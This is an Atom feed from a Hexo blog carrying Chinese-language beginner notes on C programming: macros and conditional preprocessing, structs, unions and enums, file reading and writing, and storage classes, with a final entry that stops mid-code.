<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kn0sky&#39;wiki</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://kn0sky.com/"/>
  <updated>2020-05-28T03:03:02.000Z</updated>
  <id>http://kn0sky.com/</id>
  
  <author>
    <name>kn0sky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>C语言基础09--C预处理器和C库</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8009--C%E9%A2%84%E5%A4%84%E7%90%86%E5%99%A8%E5%92%8CC%E5%BA%93/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8009--C%E9%A2%84%E5%A4%84%E7%90%86%E5%99%A8%E5%92%8CC%E5%BA%93/</id>
    <published>2020-05-28T08:40:50.000Z</published>
    <updated>2020-05-28T03:03:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础09–C预处理器和C库"><a href="#C语言基础09–C预处理器和C库" class="headerlink" title="C语言基础09–C预处理器和C库"></a>C语言基础09–C预处理器和C库</h1><h3 id="预处理器"><a href="#预处理器" class="headerlink" title="预处理器"></a>预处理器</h3><p>预处理器是<code>#</code>号开头的，比如宏：#define</p><p>宏的基本用法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Five 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,Five);<span class="comment">//在编译过程中，Five会被直接替换成5</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>带参数的宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Five(X) X*X</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,Five(<span class="number">5</span>));<span class="comment">//在编译过程中，替换成一段表达式</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Five(X) printf(<span class="meta-string">"This is %d"</span>,X)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Five(<span class="number">5</span>);<span class="comment">//在编译过程中，替换成一段表达式,打印字符串出来</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件的预处理器//#indef #else #endif</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#indef #else #endif</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Five 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> Five</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//通过define来判断执行什么语句</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>Five</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"yes"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"no"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件的预处理器 #if #elif #endif</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Five 4</span></span><br><span class="line"><span class="comment">//#undef Five</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span>Five ==5</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"yes"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> Five ==4</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"no"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以用于不同版本系统的编译</p><h3 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h3><p>代码开头的#include&lt;stdio.h&gt;是将该库中的所有代码复制进代码中，可以直接调用</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础09–C预处理器和C库&quot;&gt;&lt;a href=&quot;#C语言基础09–C预处理器和C库&quot; class=&quot;headerlink&quot; title=&quot;C语言基础09–C预处理器和C库&quot;&gt;&lt;/a&gt;C语言基础09–C预处理器和C库&lt;/h1&gt;&lt;h3 id=&quot;预处理器&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础08--结构体</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8008--%E7%BB%93%E6%9E%84%E4%BD%93/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8008--%E7%BB%93%E6%9E%84%E4%BD%93/</id>
    <published>2020-05-28T04:40:50.000Z</published>
    <updated>2020-05-28T02:46:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础08–结构体-amp-联合体-amp-枚举类型"><a href="#C语言基础08–结构体-amp-联合体-amp-枚举类型" class="headerlink" title="C语言基础08–结构体&amp;联合体&amp;枚举类型"></a>C语言基础08–结构体&amp;联合体&amp;枚举类型</h1><h3 id="结构体的声明："><a href="#结构体的声明：" class="headerlink" title="结构体的声明："></a>结构体的声明：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NPC</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> * Name;</span><br><span class="line"><span class="keyword">int</span> HP;</span><br><span class="line"><span class="keyword">int</span> MP;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NPC</span> <span class="title">xiaoer</span>;</span></span><br><span class="line">xiaoer.Name = <span class="string">"xiaoer"</span>;</span><br><span class="line">xiaoer.HP = <span class="number">100</span>;</span><br><span class="line">xiaoer.MP = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NPC</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> * Name;</span><br><span class="line"><span class="keyword">int</span> HP;</span><br><span class="line"><span class="keyword">int</span> MP;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NPC</span> <span class="title">npcarr</span>[100];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NPC</span> *<span class="title">npcindex</span>;</span><span class="comment">//声明一个结构体指针</span></span><br><span class="line">npcindex = &amp;npcarr[<span class="number">0</span>];</span><br><span class="line">npcindex-&gt;Name = <span class="string">"xiao1"</span>;<span class="comment">//通过指针可以修改内容</span></span><br><span class="line">npcindex++;<span class="comment">//指针每次移动一个结构体的量</span></span><br><span class="line">npcindex-&gt;Name = <span class="string">"xiao222"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结构体参数"><a href="#结构体参数" class="headerlink" title="结构体参数"></a>结构体参数</h3><p>在函数中的应用：作为参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NPC</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> * Name;</span><br><span class="line"><span class="keyword">int</span> HP;</span><br><span class="line"><span class="keyword">int</span> MP;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">outputNPC</span><span class="params">(struct NPC a)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\nHP=%d\nMP=%d"</span>, a.Name, a.HP, a.MP);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">initNPC</span><span class="params">(<span class="keyword">char</span> * name, <span class="keyword">int</span> HP, <span class="keyword">int</span> MP)</span> </span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NPC</span> <span class="title">npc1</span>;</span></span><br><span class="line">npc1.Name = name;</span><br><span class="line">npc1.HP = HP;</span><br><span class="line">npc1.MP = MP;</span><br><span class="line">outputNPC(npc1);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">initNPC(<span class="string">"lihua"</span>, <span class="number">10</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="联合体"><a href="#联合体" class="headerlink" title="联合体"></a>联合体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"main.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> Info &#123;</span><br><span class="line"><span class="keyword">int</span> HP;</span><br><span class="line"><span class="keyword">char</span> PlayerName;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">union</span> Info Myinfo;</span><br><span class="line">Myinfo.PlayerName = <span class="string">'a'</span>;</span><br><span class="line"><span class="comment">//联合体所有成员地址都是一样的</span></span><br><span class="line">Myinfo.HP = <span class="number">1111</span>;</span><br><span class="line"><span class="comment">//多个值初始化之后只显示最后一个值，也就是同时只能使用其中一个成员</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c\n%d\n"</span>, Myinfo.PlayerName, Myinfo.HP);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="枚举类型"><a href="#枚举类型" class="headerlink" title="枚举类型"></a>枚举类型</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"main.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">enum</span> color &#123;red,green,blue&#125;;<span class="comment">//实际是个整数类型</span></span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;flag);</span><br><span class="line"><span class="keyword">switch</span> (flag) &#123;</span><br><span class="line"><span class="keyword">case</span> red:<span class="built_in">printf</span>(<span class="string">"red"</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> green:<span class="built_in">printf</span>(<span class="string">"freen"</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> blue:<span class="built_in">printf</span>(<span class="string">"blue"</span>); <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//用来看的更清晰</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础08–结构体-amp-联合体-amp-枚举类型&quot;&gt;&lt;a href=&quot;#C语言基础08–结构体-amp-联合体-amp-枚举类型&quot; class=&quot;headerlink&quot; title=&quot;C语言基础08–结构体&amp;amp;联合体&amp;amp;枚举类型&quot;&gt;&lt;/a&gt;C语
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础07--文件操作</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8007--%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8007--%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</id>
    <published>2020-05-28T03:40:50.000Z</published>
    <updated>2020-05-28T02:46:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础07–文件操作"><a href="#C语言基础07–文件操作" class="headerlink" title="C语言基础07–文件操作"></a>C语言基础07–文件操作</h1><p>fopen模式</p><p><img src="image-20200516181229653.png" alt="image-20200516181229653"></p><p>读取文件：</p><ol><li>声明一个文件指针</li><li>通过fopen打开文件获得文件指针<ol><li>判断文件指针是否为空，为空则打开失败</li></ol></li><li>把文件指针放到文件末尾来获取文件大小</li><li>指针再移动会文件头部</li><li>申请一块缓冲区空间用来存储读取的数据<ol><li>对空间初始化</li></ol></li><li>通过fread获取文件内容和真实大小<ol><li>通过真实大小和刚刚获取的大小进行比较，如果相同则读取成功</li></ol></li><li>读取完毕，通过fclose关掉文件指针</li></ol><p>写文件：</p><ol><li>声明一个文件指针</li><li>通过fopen打开文件获得文件指针</li><li>通过fwrite来写入文件，返回1则写入成功</li><li>关闭文件指针</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//通过移动位于文件头部的指针，可以读取文件任意位置的数据，文件指针移动到末尾处，文件读取完毕</span></span><br><span class="line"><span class="comment">//声明文件指针，FILE类型</span></span><br><span class="line">FILE * pFile;</span><br><span class="line"><span class="comment">//申请一个内存空间存储文件内容，也就是char * 类型字符串</span></span><br><span class="line"><span class="keyword">char</span> * szReadTextBuffer;</span><br><span class="line"><span class="comment">//申请一个变量存储文件尺寸</span></span><br><span class="line"><span class="keyword">int</span> nReadFileSize;</span><br><span class="line"><span class="comment">//获取读取到的文件缓冲区字节数,使用fread会返回真实长度，用来判断读取是否成功</span></span><br><span class="line"><span class="keyword">int</span> nReadRetSize;</span><br><span class="line"></span><br><span class="line"><span class="comment">//fopen 可以用于打开文件，两个参数：文件路径和读取模式</span></span><br><span class="line"><span class="keyword">if</span> ((pFile = fopen(<span class="string">"E:\\123.txt"</span>, <span class="string">"rb"</span>)) == <span class="literal">NULL</span>) &#123;<span class="comment">//读取失败返回NULL</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"文件打开失败"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//通过设置文件指针到文件末尾，可以算出文件大小</span></span><br><span class="line"><span class="comment">//设置文件指针到末尾</span></span><br><span class="line">fseek(pFile, <span class="number">0</span>, SEEK_END);<span class="comment">//fseek用来设置指针位置（文件指针，0，要移动的位置）SEEK_END表示文件末尾（设定好的宏）</span></span><br><span class="line"><span class="comment">//获取文件指针的位置,获取文件大小</span></span><br><span class="line">nReadFileSize = ftell(pFile);</span><br><span class="line"><span class="comment">//文件指针复位</span></span><br><span class="line">rewind(pFile);<span class="comment">//用来恢复到初始位置</span></span><br><span class="line"><span class="comment">//根据文件尺寸声明足够大小的内存空间</span></span><br><span class="line">szReadTextBuffer = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*nReadFileSize + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//判断一下是否申请成功</span></span><br><span class="line"><span class="keyword">if</span> (szReadTextBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"failed"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对申请到的空间初始化</span></span><br><span class="line"><span class="built_in">memset</span>(szReadTextBuffer, <span class="number">0</span>, nReadFileSize + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//将依据获取到文件指针的文件内容读取到已经申请好的缓冲区中，并返回真实读取到的长度</span></span><br><span class="line">nReadRetSize = fread(szReadTextBuffer, <span class="number">1</span>, nReadFileSize, pFile);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否读取失败</span></span><br><span class="line"><span class="keyword">if</span> (nReadFileSize != nReadRetSize) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"failed"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, szReadTextBuffer);</span><br><span class="line"></span><br><span class="line">fclose(pFile);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FILE * pFile0;</span><br><span class="line">pFile0 = fopen(<span class="string">"E:\\1234.txt"</span>, <span class="string">"wb"</span>);</span><br><span class="line"><span class="comment">//fwrite作用把字符串写入文件中，第一个是缓冲区指针，第二个是写出单个元素的大小，第三个元素个数，第四个是文件指针</span></span><br><span class="line"><span class="keyword">int</span> s = fwrite(szReadTextBuffer, <span class="built_in">strlen</span>(szReadTextBuffer), <span class="number">1</span>, pFile0);</span><br><span class="line"></span><br><span class="line">fclose(pFile0);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础07–文件操作&quot;&gt;&lt;a href=&quot;#C语言基础07–文件操作&quot; class=&quot;headerlink&quot; title=&quot;C语言基础07–文件操作&quot;&gt;&lt;/a&gt;C语言基础07–文件操作&lt;/h1&gt;&lt;p&gt;fopen模式&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;image
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础06--存储类&amp;内存管理</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8006--%E5%AD%98%E5%82%A8%E7%B1%BB&amp;%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8006--%E5%AD%98%E5%82%A8%E7%B1%BB&amp;%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</id>
    <published>2020-05-28T02:40:50.000Z</published>
    <updated>2020-05-28T02:20:39.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础06–存储类-amp-内存管理"><a href="#C语言基础06–存储类-amp-内存管理" class="headerlink" title="C语言基础06–存储类&amp;内存管理"></a>C语言基础06–存储类&amp;内存管理</h1><h3 id="存储类"><a href="#存储类" class="headerlink" title="存储类"></a>存储类</h3><p>C语言有6种存储类，可以按照作用域，链接，存储时期来描述</p><p>存储时期分为两种</p><ul><li>静态存储时期：类似于局部变量</li><li>自动存储时期：类似于全局变量</li></ul><p>存储类除了指针存储类还有5种：</p><ol><li><p>自动存储类</p><p>auto ：生命周期在花括号内</p></li><li><p>寄存器存储类</p><p>register</p></li><li><p>具有外部链接的静态存储类</p><p>extern：生命周期是在整个程序内</p></li><li><p>具有外部链接的静态存储类</p><p>static：生命周期是在文件内</p></li><li><p>空链接的静态存储类</p><p>static</p></li></ol><h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> * szstr;  <span class="comment">//没初始化，所以没分配内存</span></span><br><span class="line">szstr = 